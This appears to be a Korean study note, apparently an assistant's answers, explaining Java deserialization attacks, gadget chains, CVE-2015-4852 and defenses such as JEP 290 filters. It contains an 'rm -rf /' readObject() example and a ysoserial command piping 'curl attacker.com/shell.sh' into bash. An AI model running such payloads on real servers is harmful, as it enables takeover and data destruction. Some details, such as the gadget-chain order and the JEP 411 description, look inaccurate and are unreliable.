Java 기본 직렬화:
바이트 스트림 → 클래스 메타데이터 포함 → JVM이 직접 객체 복원
"클래스 구조 자체를 그대로 저장/복원"

JSON 직렬화:
객체 → 텍스트(키-값) → 다시 객체로 매핑
"데이터만 저장/복원"

---

## 전제 이해 — 역직렬화는 생성자를 우회한다

이전에 다룬 내용이다.

```java
// 정상적인 객체 생성
User user = new User("홍길동"); // 생성자 실행

// 역직렬화로 객체 생성
User user = (User) ois.readObject(); // 생성자 실행 안 함
// JVM이 직접 힙에 객체를 올림
```

**생성자를 우회한다는 건 검증 로직도 우회한다는 뜻이다.**

---

## 근본 문제 — readObject()가 클래스 코드를 실행한다

```java
public class EvilClass implements Serializable {

    private void readObject(ObjectInputStream ois)
            throws IOException, ClassNotFoundException {

        ois.defaultReadObject();
        Runtime.getRuntime().exec("rm -rf /"); // 역직렬화 시 자동 실행
    }
}
```

`readObject()`는 역직렬화 시 자동으로 호출되는 훅 메서드다. **바이트 스트림을 읽는 순간 코드가 실행된다.**

---

## Gadget Chain — 실제 공격 원리

공격자가 `EvilClass`를 직접 만들어 보낼 수는 없다. 서버 클래스패스에 없으니까.

**핵심: 서버에 이미 있는 클래스들을 조합한다.**

```
서버 클래스패스에 Apache Commons Collections가 있다면
그 안의 클래스들을 체인처럼 연결해서
역직렬화 과정에서 임의 코드 실행까지 도달할 수 있다
```

```
바이트 스트림 역직렬화
    ↓
InvokerTransformer.readObject() 자동 호출   ← 서버에 이미 있는 클래스
    ↓
TransformedMap.readObject() 호출             ← 서버에 이미 있는 클래스
    ↓
ChainedTransformer 실행                      ← 서버에 이미 있는 클래스
    ↓
Runtime.exec("공격자 명령어")                ← 최종 도달점
```

서버 코드를 한 줄도 건드리지 않았다. **이미 있는 클래스들의 연결이 무기가 된다.**

---

## 공격 흐름 전체

```
공격자 입장:

1. 서버가 Java 직렬화를 쓰는지 확인
   → HTTP 요청/응답에 AC ED 00 05 (Java 직렬화 매직넘버) 있으면 확인

2. 서버 클래스패스 추측
   → 라이브러리 버전 노출, 에러 메시지 등으로 파악
   → Apache Commons Collections 3.1이 있다 → CVE-2015-4852 사용 가능

3. ysoserial 도구로 페이로드 생성
   java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/shell.sh | bash"
   → 조작된 바이트 스트림 생성

4. 서버에 전송
   POST /api/endpoint
   Body: [조작된 바이트 스트림]

5. 서버에서 ois.readObject() 실행
   → 체인 실행
   → curl attacker.com/shell.sh | bash 실행
   → 서버 장악
```

---

## 왜 막기 어려운가

```java
// 이렇게 막으려 해도
ObjectInputStream ois = new ObjectInputStream(input) {
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc)
            throws IOException, ClassNotFoundException {

        // 클래스 이름을 확인하려면 이미 스트림을 읽고 있는 중
        // 체인의 중간 클래스는 전부 정상적인 클래스들
        // 어디서 끊어야 하는지 판단이 어려움
        return super.resolveClass(desc);
    }
};
```

**개별 클래스는 전부 정상이다. 조합이 무기다.**

---

## 해결책

```java
// 1. Java 기본 직렬화 자체를 쓰지 않는다 (근본 해결)
// JSON, Protobuf 등으로 대체

// 2. 써야 한다면 — 허용 클래스 화이트리스트
// JEP 290 (Java 9+): 역직렬화 필터
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.dto.*;!*"  // 내 DTO만 허용, 나머지 전부 차단
);
ois.setObjectInputFilter(filter);

// 3. 외부 입력을 절대 역직렬화하지 않는다
// 신뢰할 수 없는 소스의 바이트 스트림은 readObject() 금지
```

> 📎 **근거:** JEP 290 — _"Filter Incoming Serialization Data"_, CVE-2015-4852 — Apache Commons Collections RCE

---

## 한 줄 정리

```
역직렬화 = 코드 실행 가능한 진입점
외부 입력 + readObject() = 공격자가 서버에서 임의 코드 실행 가능
```

**Effective Java Item 85:**

> "자바 역직렬화는 근본적으로 위험하다. 신뢰할 수 없는 데이터는 역직렬화하지 마라."

---
좋은 질문이다. 두 가지를 분리해서 답한다.

---

## 1. Java 기본 직렬화가 실제로 쓰이는 곳

```java
// 1. HttpSession 클러스터링
// 톰캣이 세션을 다른 서버로 복제할 때
// Serializable 구현한 객체만 세션에 저장 가능
HttpSession session = request.getSession();
session.setAttribute("user", user); // User implements Serializable

// 2. RMI (Remote Method Invocation)
// Java 서버끼리 객체를 직접 주고받는 구조
// 현재는 거의 안 씀

// 3. 캐시
// Ehcache, 구버전 Redis 연동 시
// 객체를 바이트로 직렬화해서 저장

// 4. JMS 메시지
// ActiveMQ 등에서 Java 객체를 메시지로 전송
```

**공통점: 전부 "Java to Java" 통신이다.** JSON처럼 사람이 읽을 필요 없고, 다른 언어와 통신할 필요도 없는 환경.

---

## 2. 왜 개선하지 않는가 — 하위 호환성 문제

```
Java 1.1 (1997년)에 도입
현재 2024년까지 27년간 쌓인 코드베이스

Serializable을 구현한 클래스가 전 세계에 얼마나 있을까:
- JDK 내부 클래스 (ArrayList, HashMap, Exception ...)
- 수십 년간 작성된 엔터프라이즈 코드
- 레거시 시스템
```

```java
// ArrayList도 Serializable이다
public class ArrayList<E>
    implements List<E>, Serializable { ... }

// 이걸 바꾸면 ArrayList를 직렬화해서
// 저장해둔 모든 데이터가 읽기 불가가 됨
```

**Java는 하위 호환성을 절대 깨지 않는다는 원칙이 있다.** 개선하려면 기존 코드가 전부 깨진다.

---

## 3. 실제로 개선 시도는 했다

**JEP 290 (Java 9, 2017년) — 역직렬화 필터:**

```java
// 허용할 클래스를 화이트리스트로 제한
ObjectInputFilter filter =
    ObjectInputFilter.Config.createFilter("com.myapp.*;!*");
ois.setObjectInputFilter(filter);
// 근본 해결은 아님 — 여전히 같은 구조
```

**JEP 411 방향 — 직렬화 자체를 대체하려는 시도:**

```
Project Amber, Project Valhalla에서
새로운 직렬화 메커니즘을 설계 중
기존 Serializable과 별개로 만들어서
하위 호환성을 유지하면서 새 방식 제공 예정
```

> 📎 **근거:** JEP 290 — _"Filter Incoming Serialization Data"_, Brian Goetz (Java 언어 설계자) — _"Towards Better Serialization"_ (2019) — _"Java의 직렬화는 설계상 실수였다"_ 고 직접 언급

---

## 4. 실무 결론

```
쓰는 경우:
- 레거시 시스템 유지보수
- 톰캣 세션 클러스터링 (어쩔 수 없이)

쓰지 말아야 하는 경우:
- 외부 입력을 역직렬화할 때 (RCE 직행)
- 신규 시스템 설계 (JSON/Protobuf로 대체)

Spring 실무에서:
- RedisTemplate 기본 설정이 Java 직렬화 → 반드시 교체
- 세션 저장소도 JSON 직렬화로 교체 권장
```

**한 줄 요약:** 설계 실수였는데, 27년치 하위 호환성 때문에 못 고치고 있는 것이다.

